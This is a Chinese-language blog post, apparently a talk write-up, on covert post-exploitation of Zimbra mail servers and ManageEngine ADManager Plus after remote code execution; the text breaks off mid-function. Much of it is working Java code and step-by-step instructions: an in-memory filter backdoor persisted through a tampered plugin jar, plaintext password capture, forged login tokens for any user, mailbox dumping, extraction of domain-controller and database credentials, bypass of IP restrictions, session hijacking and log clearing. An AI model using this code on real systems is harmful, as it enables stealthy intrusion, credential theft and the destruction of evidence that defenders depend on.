#  High-value Web Application Post-RCE Penetration Research   
Skay  赛博回忆录   2024-08-27 08:51  
  
**议题概述**  
  
议题分享了高价值系统如邮件服务器、网关设备、文档、企业知识管理与协同平台、单点登录平台、缺陷跟踪平台、IT运维管理软件、域管理团建、代码仓库管理等平台的RCE后利用研究，针对不同应用，通过部署高隐蔽性插件、废弃功能利用等方式实现运行时劫持Web容器请求处理逻辑以及在内存中植入高隐藏性的持久性后门，以植入到内存中的后门作为加载器，实现内存加载执行有效负载，后门代码逻辑及功能性负载负载均在内存中运行。通过对不同应用代码逻辑的逐一深入分析，研究了解决负载在内存中运行时遇到的多重类加载器类加载、规避系统文件校验防护、上下文解耦进行功能代码提取.........等问题的解决方法。实现了在不对目标发起额外网络请求及无文件落地的情况下在内存中执行有效负载，从而在高度隐蔽攻击行为下获取系统高价值信息如：邮件获取、明文密码记录、运维数据获取、未知密码下任意登录凭证获取、获取域控信息、单点登录劫持、痕迹清理等操作。进而利用现有的Webshell管理工具加密数据回传数据流量实现流量侧隐藏。从而达到在真实攻击场景中实现更加全面、隐蔽、长期的后利用信息收集及深入渗透。  
  
今天不着重讨论漏洞本身，我们把目光着眼于后利用研究。当我们已经通过漏洞或者其它渠道，可以在运行着一些重要应用的目标服务器执行系统命令时，怎样更加全面、隐蔽、长期的收集应用中的关键信息。  
  
**首先，哪些系统属于高价值Web应用？**  
  
邮件服务器、网关设备、文档、企业知识管理与协同平台、单点登录平台、缺陷跟踪平台、IT运维管理软件、域管理团建、代码仓库管理平台....等  
  
由于应用的特殊性，在真实的攻击场景中，往往需要对以上高价值系统进行更全面、隐蔽、长期信息获取。     
  
**一、邮件服务器**  
  
邮服是公司、企业以及目标机构内部信息中转的核心应用，其中存储的邮件本身、用户凭证等信息是攻击者渗透攻击的重要目标。很多攻击行动往往最终目的为邮服中某个邮件。  
  
站在攻击者视角，针对邮服攻击场景总结以下常用后渗透功能：  
  
长期稳定的后门、邮件获取(搜索邮件、导出指定用户邮件、根据日期用户过滤邮件等)、数据路连接信息获取、用户电话地址等详细信息、用户明文密码记录、登录任意用户以及最后的痕迹清理  
  
Zimbra 是一个电子邮件和协作平台，包括聊天、视频会议、日历、 联系人、任务、文件共享/编辑，并且集成了Slack、Zoom、Dropbox 等内置功能。500 多个SaaS 合作伙伴以及2000 多家经销商都在使用 Zimbra 的产品。Zimbra 是全球开源电子邮件协作软件领域的领先供应商。其全球部署数量高达十万级  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwLZ6d89m8bksmCuiad5qPQLXZiccChX06XibeyGEEYdN2RW0ia6Gxw1CH2w/640?wx_fmt=png "")  
  
第一部分以zimbra为例简述，如何更全面隐蔽以及长期的获取其中的关键信息，  
  
**首先是权限的持久化，后门隐蔽性问题**  
  
为了提高后门的隐蔽性，采用无需落地的内存Shell，针对重启失效问题，可以采用agent形式，但是与其新增一个落地jar文件，不如修改已有文件。当然还需修改文件修改时间zimbra本身功能上支持插件扩展，且默认安装以下常用插件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabw4r4UuHLp9lqqSqxghJTialNLwPbMKTPqHHMB5eQu5e4osfY0NXt1wTA/640?wx_fmt=png "")  
  
将我们的内存Shell注入逻辑放到插件中，每次重启均会加载  
  
zimbra 使用的中间件为Jetty，运行时注入一个/* 的Filter，恶意Filter作为服务端以内存形式存在于系统中，每个请求都会经过FIlter处理，正常业务逻辑放行，只有当使用Godzilla客户端访问时，才会触发Filter中代码逻辑  
  
避免服务重启导致Filter失效，修改zimbra-license-success插件，每次服务重启都会加载插件，对插件进行初始化，通过修改插件初始化逻辑com.zimbra.cs.network.license.service.LicenseService，使得每次重启都会注入恶意Filter内存马      
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwvnu3gbh38G0bH7GxDqDj5F8iah9OoeFvic2YQ2o5iaCuEuq4jb1b3VAlg/640?wx_fmt=png "")  
  
至此，就实现了一个稳定、隐蔽且长期的后门。后门有了，我们如何获取到想要的数据？Zimbra本身提供了一系列SOAP API接口来操作邮件、用户，  
https://files.zimbra.com/docs/soap_api/9.0.0/api-reference/index.html  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwL5jukLVbsNC0k0eQxVzicCp5ErejBM74CFCLJHfZn0n8aTJv3kOcicicA/640?wx_fmt=png "")  
  
同时提供python-zimbra库，提供处理创建 Zimbra SOAP 查询功能，并将Http请求其发送到后端进行处理。     
总的来说我们可以通过发送Http请求来调用SOAP API来查到想要的数据，But真的要动静这么大么？数据信息在内存中获取而不调用Web API，从而使得获取信息更加隐蔽。接下来逐一分析如何在内存中获取各种数据信息：如何从成千上万Class中找到方法并返回我们想要的数据？切入点只能从已知功能入手例如已知的SOAP API存在以下命名空间  
  
zimbraAccount 帐户服务包括用于检索、存储和管理用户帐户信息的命令。  
  
zimbraAdmin 管理服务包括用于管理 Zimbra 的命令。  
  
zimbraAdminExt 管理扩展服务包括用于管理 Zimbra 的附加命令。  
  
zimbraMail 邮件服务包括用于管理邮件和日历信息的命令。  
  
zimbraRepl zimbraRepl 服务包括用于管理 Zimbra 服务器复制的命令。  
  
zimbraSync zimbraSync 服务包括使用同步管理设备的命令。  
  
zimbraVoice zimbraVoice 服务包括与统一通信相关的命令。  
  
通过对以上API接口请求调用栈分析，最终将我们想要的方法剥离出来。  
  
但是debug过程中存在context 、上下文、request等与请求强相关的参数传入，从层层紧密嵌套的调用栈中解构出来某个方法或属性是一件比较棘手的问题。  
  
回到问题出发点，我们获取的大部分邮件以及用户信息等必定以某种形式存储在系统中，各种类型的数据库或者其它存储容器，是否可以绕过复杂的调用栈与数据库直接交互获取数据？可以，但在zimbra不太适用。     
  
经过对zimbraMail 接口的调试发现，邮件数据主要调用Lucene进行搜索查询，并不是常规的JDBC数据库方式，写一个搜索逻辑成本远远大于代码中寻找合适的Api进行调用。我们逐个分析每个功能需要调用的API  
  
**1.数据库连接信息**  
  
jdbc连接信息往往都以加密的方式存放在某个文件中，既然我们可以在运行时执行代码，不如直接获取内存中解密后的明文连接信息，通过debug后可知，jdbc连接信息存储在com.zimbra.cs.db.MySQL.MySQLConfig类中，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwSic8OwyPGBBt7GzkmiaZXktJ29FcPN1eZtdQDHwCj2gdNZT01d8AMnyA/640?wx_fmt=png "")  
  
             
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwVg3Niae1ZibuGiafFcPZ5EpN35YJagIGK1u80VpqbYtqx4ZRSrzjt9DSw/640?wx_fmt=png "")  
  
很幸运地我们可以直接调用com.zimbra.cs.db.MySQL#getPoolConfig方法获取到数据库属性信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwxAQBIsHDTsKlrZk7A6tGYyPGSUnSN6kExVhvGPKib59aSp4icZ1mWIDw/640?wx_fmt=png "")  
  
因为方法以及类并不是public，这里还需要使用反射进行间接调用，具体实现代码如下：     
  
```
try {
Class unsafeClass = Class.forName("sun.misc.Unsafe");
Field field = unsafeClass.getDeclaredField("theUnsafe");
field.setAccessible(true);
Unsafe unsafe = (Unsafe) field.get(null);
Module baseModule = Object.class.getModule();
Class currentClass = Main.class;
long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
unsafe.putObject(currentClass, offset, baseModule);
           
Method methodgetpoolconfig = Class.forName("com.zimbra.cs.db.MySQL").getDeclaredMethod("getPoolConfig");
methodgetpoolconfig.setAccessible(true);
           
Class mysqlconfigclass = Class.forName("com.zimbra.cs.db.MySQL$MySQLConfig");
Method method = mysqlconfigclass.getDeclaredMethod("getDBProperties");
method.setAccessible(true);
Properties properties = (Properties) method.invoke(methodgetpoolconfig.invoke((MySQL)Db.getInstance()));
password = properties.getProperty("password");
} catch (Exception e) {
throw new RuntimeException(e);
}
```  
  
  
执行效果如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwnG10vUic1HmkfMFX8sTG8jPEOLfMRy57tbTsfB8fLrGiaPwh13XhHHMw/640?wx_fmt=png "")  
  
**2.用户列表及详情获取**  
  
这个相对来说比较简单，Zimbra将每个用户映射成具体的Account类(com.zimbra.cs.account.Account)，对象属性中保存着每个用户的电话 收集 公司 职务部门 办公室 地址等详细信息，通过com.zimbra.cs.account.Entry#getAttrs方法可以获取所用属性      
  
Account对象的获取没有提供直接接口方法，通过对Zimbra代码分析，找到了com.zimbra.cs.account.Provisioning类，可以理解为此类未Zimbra核心配置类，对系统中的Account、Domain、Server等信息进行了统一管理，并提供接口进行访问，通过调用com.zimbra.cs.account.Provisioning#searchDirectory方法获取系统中所有Accounts，其参数构造如下SearchDirectoryOptions  
```
Provisioning prov = Provisioning.getInstance();
SearchDirectoryOptions options = new SearchDirectoryOptions();
options.setDomain(null);
options.setTypes("accounts");
options.setMaxResults(5000);
options.setFilterString(ZLdapFilterFactory.FilterId.ADMIN_SEARCH, null);
options.setReturnAttrs(null);
options.setSortOpt(SearchDirectoryOptions.SortOpt.SORT_ASCENDING);
options.setSortAttr("name");
options.setConvertIDNToAscii(true);
options.setMakeObjectOpt(SearchDirectoryOptions.MakeObjectOpt.NO_DEFAULTS);
List accounts = prov.searchDirectory(options);
```  
  
  
执行效果如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabw3xhRxJlWxGUrk0PfUmEFI67Pms3OS0GNjVuw9LGhTy7tqG6CgYro7g/640?wx_fmt=png "")  
  
**3.生成任意用户登录凭证**  
  
登录成功，肯定会生成有效的session返回给客户端，通过Debug 登录过程//todo调用栈，定位到com.zimbra.cs.service.AuthProvider#getAuthToken方法，构造参数及实现逻辑如下：  
  
```
Account account = getAccounts(new String((byte[]) user.get("username")));
AuthToken.TokenType tokenType = AuthToken.TokenType.fromCode("");    
ZimbraAuthToken authToken = (ZimbraAuthToken) AuthProvider.getAuthToken(account, 0, tokenType);
token = authToken.getEncoded();
```  
  
  
获取admin邮箱登录凭证如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwOuslYefPVibP7ArPNl9D58DOnic86DCfo0tCAbvHzF3v3NJ1j3RoW6Dw/640?wx_fmt=png "")  
  
             
  
**4.邮件信息获取**  
  
所有邮件查询接口均在com.zimbra.cs.index.ZimbraQuery中，http调用栈中的方法调用稍显复杂 //todo调用栈  
  
经过尝试无法找到可以独立于调用栈，去除上下文等参数的方式进行直接接口调用，所以尝试构造OperationContext、SearchParams、Mailbox等参数，其中OperationContext为http请求中的上下文、SearchParams为查询参数，经过调试发现通过操作SearchParams，可以实现邮件的精细过滤查找例如：根据用户查找(通过构造MailBox对象)、根据日期查找、根据关键词过滤查找等  
  
```
//根据日期过滤某个账户下邮件内容
public String getMailbyDate(Map user) throws Exception{
HashMap resp = new HashMap();
DbPool.startup();
//        String queryString = "after:\"01/15/2023\" before:\"01/16/2024\"";
String queryString = new String((byte[]) user.get("date"));
Account account = getAccounts(new String((byte[]) user.get("username")));
Mailbox mailbox = MailboxManager.getInstance().getMailboxByAccount(account);
OperationContext octx = new OperationContext(account, true);
octx.setmResponseProtocol(SoapProtocol.Soap12);
SearchParams searchParams = new SearchParams();    
searchParams.setQueryString(queryString);
searchParams.setTypes("conversation");
searchParams.setSortBy("dateDesc");
ZimbraQuery query = new ZimbraQuery(octx, SoapProtocol.Soap12, mailbox, searchParams);
ZimbraQueryResults zimbraQueryResults = query.execute();
resp = putHits(zimbraQueryResults,searchParams);
           
String respstr = "";
for (int i = 0; i     <resp.size();i++){< span>
     </resp.size();i++){<>
int conversationId = (int) resp.get(i);
if(conversationId < 0){
conversationId = -conversationId;
}
respstr =respstr+getsingleMail(account,conversationId)+"\r\n";
}
           
return respstr;
           
}
           
//获取某个账户下收件箱全部内容
           
public String getMailsomebody(Map user) throws Exception{
HashMap resp = new HashMap();
DbPool.startup();
String queryString = "in:\"Inbox\"";
Account account = getAccounts(new String((byte[]) user.get("username")));
Mailbox mailbox = MailboxManager.getInstance().getMailboxByAccount(account);
OperationContext octx = new OperationContext(account, true);
octx.setmResponseProtocol(SoapProtocol.Soap12);
SearchParams searchParams = new SearchParams();
searchParams.setQueryString(queryString);
searchParams.setTypes("conversation");
searchParams.setSortBy("dateDesc");
ZimbraQuery query = new ZimbraQuery(octx, SoapProtocol.Soap12, mailbox, searchParams);
ZimbraQueryResults zimbraQueryResults = query.execute();
resp = putHits(zimbraQueryResults,searchParams);
           
String respstr = "";
for (int i = 0; i     <resp.size();i++){< span>
     </resp.size();i++){<>
int conversationId = (int) resp.get(i);    
if(conversationId < 0){
conversationId = -conversationId;
}
respstr =respstr+getsingleMail(account,conversationId)+"\r\n";
}
return respstr;
}
```  
  
  
获取admin所有发件箱内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwyiaF96ia8NwibeuA7aBKlyxmXeUe9oRy9VQWib8D3kdXLSqSwpf26BRW1A/640?wx_fmt=png "")  
  
**5.明文密码记录及获取**  
  
由于每个用户的登录密码在数据库中为哈希加密算法存储，无法进行解密，只能通过实时记录的方式捕捉用户登录动作进行明文密码的获取。这里选在在Jetty运行内存中注入"/*" 的Filter，登录请求将会走入RecordPassword.dofilter逻辑，登录数据包如下：     
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwxZAXjjMjrLGLPOhsbmkHV707Yzr7Sada3DPibY4mazrrjlCB2iaib3RcA/640?wx_fmt=png "")  
  
dofilter中尝试获取username、password参数，再将其记录到类变量  
  
public static ArrayList userinfo = new ArrayList<>();  
  
中，dofilter逻辑如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwYyMmdC2Y6sglYHyKYk6RADUgEBWzlp0pKDicLGhYvx8wD4H6Fy9PWxA/640?wx_fmt=png "")  
  
注入明文密码Filter效果如下(每次运行只允许注入一次)：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwUt3OvgUDgOe7nYD36ibN6x5AtcCjvaPpUjHk3QiclccHEn3VD0XFyrDQ/640?wx_fmt=png "")  
  
获取记录的明文信息只许内存中读取userinfo 类变量的值即可：  
```
try {
Class unsafeClass = Class.forName("sun.misc.Unsafe");    
Field field = unsafeClass.getDeclaredField("theUnsafe");
field.setAccessible(true);
Unsafe unsafe = (Unsafe) field.get(null);
Module baseModule = Object.class.getModule();
Class currentClass = Main.class;
long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
unsafe.putObject(currentClass, offset, baseModule);
           
Field userinfofiled = Class.forName("RecordPassword").getDeclaredField("userinfo");
userinfofiled.setAccessible(true);
ArrayList userinfo = (ArrayList) userinfofiled.get(Class.forName("RecordPassword").newInstance());
for(Object tmp:userinfo){
password = password + tmp.toString() + "\r\n";
}
} catch (Exception e) {
throw new RuntimeException(e);
}
```  
  
  
获取记录的明文密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwLCSdpT1QwJoISMUZ8qRduuViaLlLw2LHcicEu0FnktKty8LYt89yskYA/640?wx_fmt=png "")  
  
             
  
             
  
所有有效载荷，以上所有功能均在内存中运行  
  
以上代码逻辑放在后门shell里略显臃肿，以及涉及到数据传输过程中容易被发现的问题。我们借鉴Webshell的思路，Godzilla支持在webshell中执行任意代码逻辑，我们只需将以上代码集成到Godzilla插件中，代码的执行以及数据的返回会经过Godzilla webshell的流量隐藏及加密操作，后门数据传输过程中捕捉流量如下：  
  
             
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwwRSaFhM1bDdPiabnkcNJJtEbITcibEBRTVBhOjJK2RKKaiciaGNq8meuoQ/640?wx_fmt=png "")  
  
       
  
**使用指南**  
  
1.上传injec.jsp 文件到目标向系统  
  
上传目录/opt/zimbra/jetty_base/webapps/zimbra/public/     
  
2.访问inject.jsp 像系统注入内存后门并删除inject.jsp 后门仍旧存在![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwBv2pgG4gQL6o2ibXDgu5F6U4bLkCIRyW69RAeYmzlsfUxNaoAickwviag/640?wx_fmt=png "")  
  
  
删除inject.jsp 连接内存后门成功      
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabw7RqsDGvHQQ4EWbHQN0N7PMRJypDTH1HEUgWszPdxddic42MkE80Um8g/640?wx_fmt=png "")  
  
             
  
3.持久化  
  
避免重启后内存中后门被清除，替换zimbra-license.jar插件  
  
将恶意zimbra-license-success.jar替换系统原有jar包，实现后门持久化  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwHseUOUbGJtwdyD3YJ1qM541W9dNyKcy7ChaaWyuP7M8Tq8SdyqRwXg/640?wx_fmt=png "")  
  
        
  
4.清除日志  
  
使用zimbraplugin ClearLog功能清除恶意jsp访问日志  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwh7eJ2hMGU7x3gWPwGJCcrwAiaF93uqH6A7ic2uia0Dn66CVH3PLNs3jhw/640?wx_fmt=png "")  
  
         
  
5.功能载荷  
  
根据需要使用特定功能  
  
点击对应功能后，有效载荷将发送至服务器后门，并在内存中执行对应载荷      
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwQ7kROHLruGIjRPMlmUd4aVuiaVNJGahUmZsLxd6qlNZ43uphfKmtYAw/640?wx_fmt=png "")  
  
             
  
6.流量完全隐蔽  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabw9gX51TV6H6TtT18h46NWo7I0r2OZ0ASm2pYrMDII9BbQLjaWZEBGSg/640?wx_fmt=png "")  
  
             
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwiauKtySu9lqcoicMUIYZxACtn606leMM3e4ia7TsbqtdSWDOAOtvfUZeQ/640?wx_fmt=png "")  
  
             
  
测试版本9.0.0_GA_4583  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwm9ibD0SDFVhKBEPnXgKibocxR0HLaNNr0FPvHsUFdfYGyDwDnOqdM6UA/640?wx_fmt=png "")  
  
             
  
**二、zoho微软活动目录管理软件**  
  
ZOHO ManageEngine ADManager Plus是美国卓豪（ZOHO）公司的一套为使用Windows域的企业用户设计的微软活动目录管理软件。该软件能够协助AD管理员和帮助台技术人员进行日常管理工作，例如批量管理用户帐户和AD对象、给帮助台技术员指派基于角色的访问权限等。  
  
试想一下，如果我们可以得到软件中的域控信息，将可以直接接管目标整个域。     
  
功能上AdManager主要功能围绕域管理展开，其所有数据均保存在默认安装的postgresql中，除去登录密码等信息为加密存储，域结构用户、机器等信息均明文在数据库中保存。所以针对ADManager后渗透大多数功能编写，可以避开Web请求调用栈的分析，可以直接接入数据库中进行查询。  
  
针对此软件的功能，我们实现后门功能上支持：获取域控管理员信息及数据库存储域信息、获取数据库连接信息、获取集成第三方应用凭证信息、生成最高权限账户有效登录信息、限制IP登陆后绕过、明文密码记录等功能。  
  
功能实现  
  
**1.数据库连接信息获取**  
  
数据库信息获取可以通过两种方法，数据库信息通过配置文件的方式存储在$HOME\ADManager Plus\conf\database_params.conf 中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwFDq6NAkfbDWJknOuXk9nhcia5Z2vTwxnbA3LtNAootichibqVR5kHjCyQ/640?wx_fmt=png "")  
  
经过对Admanager代码分析，密码是可以解密的，解密方式如下：  
  
com.zoho.framework.utils.crypto.CryptoUtil.decrypt("29b346ed0201f112b4fa21aa091cc29fbe1f742720968de6343791a49e4263fc639283b4",2)      
  
第二种方法是运行时数据库连接信息会存在在特定对象中，  
  
```
Properties properties = PersistenceInitializer.getDBProps(PersistenceInitializer.getDBParamsFilePath());
properties中存储了username、password等信息，功能实现逻辑如下：
Properties properties = PersistenceInitializer.getDBProps(PersistenceInitializer.getDBParamsFilePath());
returnstr = returnstr+"url="+properties.getProperty("url")+"\r\n";
returnstr = returnstr+"password="+properties.getProperty("password")+"\r\n";
returnstr = returnstr+"username="+properties.getProperty("username")+"\r\n";
returnstr = returnstr+"drivername="+properties.getProperty("drivername")+"\r\n"
```  
  
  
工具执行效果图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwIwAjeuDMX5BgiaqRRlkdlrqibL0a1J248icPBpE2piat4DnicrfvWQgpMnA/640?wx_fmt=png "")  
  
**2.域控凭证信息获取**  
  
域控信息保存在表adsmdomainconfiguration中，通过上面获得的数据库连接信息，很容易获得到加密后的域控凭证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwcCvib6vSJMMrZ7hElB97ndlY8ALAafhCO5f9EphmetatYlPut3Vb2sg/640?wx_fmt=png "")  
  
但是这里解密出现了一些问题      
  
换个思路，管理员前台可以修改域控凭证，那么域控凭证在与旧密码对比时以及存入数据库中必定会涉及到加解密操作  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwCUdEf5Ysn1fkEZTvg0cpVodIbbtIlJibSWjfxvn6Re66kB0MwThgKJg/640?wx_fmt=png "")  
  
请求接口：  
http://192.168.220.72:8080/api/json/home/addDomain  
  
请求处理逻辑：com.adventnet.sym.adsm.common.webclient.DomainAction#addDomain  
  
跟踪调用栈，发现运行时com.adventnet.sym.adsm.common.server.cache.DomainCacheManager#getDomainData方法中会直接获取到域控密码的明文  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwZ9HiarKLL8eB9fG5Spic7qFEicKAibxErdVe1Hs4XPejKLoxnRwdVqKtfg/640?wx_fmt=png "")  
  
调用栈如下      
```
getDomainData:151, DomainCacheManager (com.adventnet.sym.adsm.common.server.cache)
getDomainDataAsProps:64, DomainCacheManager (com.adventnet.sym.adsm.common.server.cache)
getConfiguredValues:209, HDTDomainHandler (com.adventnet.sym.adsm.common.server.helpdesk)
addDomain:698, DomainAction (com.adventnet.sym.adsm.common.webclient)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
execute:104, ADSMServletAPIController (com.adventnet.sym.adsm.common.webclient)
processRequest:37, ADSMServletAPIAction (com.adventnet.sym.adsm.common.webclient)
doPost:27, ADSMServletAPIAction (com.adventnet.sym.adsm.common.webclient)
```  
  
  
所以我们很容易可以调用DomainCacheManager.getInstance().getDomainData("domainname")  
  
方法获取到明文的域控信息  
  
domain那么直接从数据库中读取即可，最终实现逻辑：  
  
```
public String getdcinfo() {
String returnstr ="";
Connection c = null;
Statement stmt = null;
try {
Properties properties = PersistenceInitializer.getDBProps(PersistenceInitializer.getDBParamsFilePath());
Class.forName("org.postgresql.Driver");
c = DriverManager.getConnection(properties.getProperty("url"),properties.getProperty("username"), properties.getProperty("password"));
c.setAutoCommit(false);
}catch (Exception e){
returnstr = "DB Connection fail";
}
           
try {
ArrayList domainnames = new ArrayList();
stmt = c.createStatement();
ResultSet rs = stmt.executeQuery("SELECT * FROM adsdomains");
while(rs.next()){
domainnames.add(rs.getString("domain_name"));    
}
rs.close();
stmt.close();
for(int i = 0; i
returnstr = "Domain 1: \r\n";
Properties domainproperties = DomainCacheManager.getInstance().getDomainData((String) domainnames.get(i));
for (String key : domainproperties.stringPropertyNames()) {
if(domainproperties.getProperty(key) instanceof String){
returnstr = returnstr+key + "->" + domainproperties.getProperty(key)+"\r\n";
}
}
returnstr = returnstr + "--------------------------------------------------------\r\n";
}
}catch (Exception e){
           
}
return returnstr;
}
```  
  
  
执行效果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwVmXM27C7CcgQpgnglEUiadKUhBrAqxmzWgNUKcaKbPsVV9nlyN3ib1dg/640?wx_fmt=png "")  
  
**3.获取集成第三方应用凭证信息**  
  
存储在数据表thirdpartydbdetails以及o365thirdpartysettings中，简单的jdbc 数据库查询逻辑  
  
```
public String getthirdparty() {
String returnstr ="";
Connection c = null;    
Statement stmt = null;
Connection c1 = null;
Statement stmt1 = null;
try {
Properties properties = PersistenceInitializer.getDBProps(PersistenceInitializer.getDBParamsFilePath());
Class.forName("org.postgresql.Driver");
c = DriverManager.getConnection(properties.getProperty("url"),properties.getProperty("username"), properties.getProperty("password"));
c.setAutoCommit(false);
c1 = DriverManager.getConnection(properties.getProperty("url"),properties.getProperty("username"), properties.getProperty("password"));
c1.setAutoCommit(false);
}catch (Exception e){
returnstr = "DB Connection fail";
}
ArrayList databaselist = new ArrayList<>();
try {
stmt = c.createStatement();
ResultSet rs = stmt.executeQuery("SELECT * FROM thirdpartydbdetails");
if(rs.next()){
returnstr = "ThirdPartyDB Info :\r\n";
String db_type = rs.getString("db_type");
String authentication_type = rs.getString("authentication_type");
String username = rs.getString("username");
String password = rs.getString("password");
String server_name = rs.getString("server_name");
String port_number = rs.getString("port_number");
returnstr = returnstr+server_name+" "+db_type+" "+port_number+" "+username+" "+password+" "+authentication_type+"\r\n";
}else {
returnstr = returnstr+"No ThirdPartyDB Info \r\n";
}
c.setAutoCommit(false);
stmt1 = c1.createStatement();
ResultSet rs1 = stmt1.executeQuery("SELECT * FROM o365thirdpartysettings");
if(rs1.next()){
returnstr = "o365DB Info :\r\n";
String db_type = rs1.getString("db_type");
String db_connection_setting = rs1.getString("db_connection_setting");
String username = rs1.getString("user_name");
String password = rs1.getString("password");    
String server_name = rs1.getString("server_name");
String port_number = rs1.getString("port");
returnstr = returnstr+server_name+" "+db_type+" "+port_number+" "+username+" "+password+" "+db_connection_setting+"\r\n";
}else {
returnstr = returnstr+"No o365DB Info \r\n";
}
rs1.close();
stmt1.close();
rs.close();
stmt.close();
}catch (Exception e){
           
}
return returnstr;
}
           
```  
  
  
**4.限制IP登陆后绕过**  
  
Zoho ADManager具有限制登录IP功能  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwKwLZib0hDJUKo2VJpADxGDia6RX6tA29tlseQtO1iaiaL7d1Cia79Sy3hyQ/640?wx_fmt=png "")  
  
限制开关也存储在数据库中adsiprestriction      
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwVvM126Qe0oLsiaTCCZcyCwYZ5xhKFfxbnUibJ5lVKf40I6jBfjrSVsPQ/640?wx_fmt=png "")  
  
所以只需要修改is_enable字段值即可  
  
```
public String bypass() {
String returnstr = "";
Connection c = null;
Statement stmt = null;
try {
Properties properties = PersistenceInitializer.getDBProps(PersistenceInitializer.getDBParamsFilePath());
Class.forName("org.postgresql.Driver");
c = DriverManager.getConnection(properties.getProperty("url"),properties.getProperty("username"), properties.getProperty("password"));
c.setAutoCommit(false);
}catch (Exception e){
returnstr = "DB Connection fail";
}
try {
stmt = c.createStatement();
String sql = "UPDATE \"adsiprestriction\" SET \"is_enabled\" = 'f' WHERE \"id\" = 1;";
stmt.executeUpdate(sql);
c.commit();
returnstr = "Changes take effect";
}catch (Exception e){
returnstr = "Change fail";
}
return returnstr;
}
```  
  
  
             
  
**5.生成最高权限账户有效登录信息**  
  
ADManager 通过将session存储在数据库中来实现session的持久化。  
  
SELECT * FROM "admphdtlogonaudit"      
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwjRr8XGcibSQ8TUVCDPsibcTxeUubh05fWYfZqPMVjzZh0m4fOQfBOuDw/640?wx_fmt=png "")  
  
当前功能模块支持获取当前所有ACTIVE状态session，以及修改最近登录的用户session状态为ACTIVE，实现如下  
  
```
public String getsession() {
String returnstr="";
Connection c = null;
Statement stmt = null;
try {
Properties properties = PersistenceInitializer.getDBProps(PersistenceInitializer.getDBParamsFilePath());
Class.forName("org.postgresql.Driver");
c = DriverManager.getConnection(properties.getProperty("url"),properties.getProperty("username"), properties.getProperty("password"));
c.setAutoCommit(false);
}catch (Exception e){
returnstr = "DB Connection fail";
}
try {
HashMap sessions = new HashMap();
stmt = c.createStatement();
ResultSet rs = stmt.executeQuery("select * from admphdtlogonaudit ");
String activesession = "";
Long logoff_time = 0L;
while(rs.next()){
String isactive = rs.getString("logon_status");
String login_user = rs.getString("technician_name");
String issuccess = rs.getString("logon_attempt");    
if(isactive.equals("ACTIVE")&& login_user.equals("admin")&&issuccess.equals("SUCCESS")){
activesession = rs.getString("session_id");
returnstr = returnstr+"Valid user session information in the system : "+login_user+"->"+activesession+"\r\n";
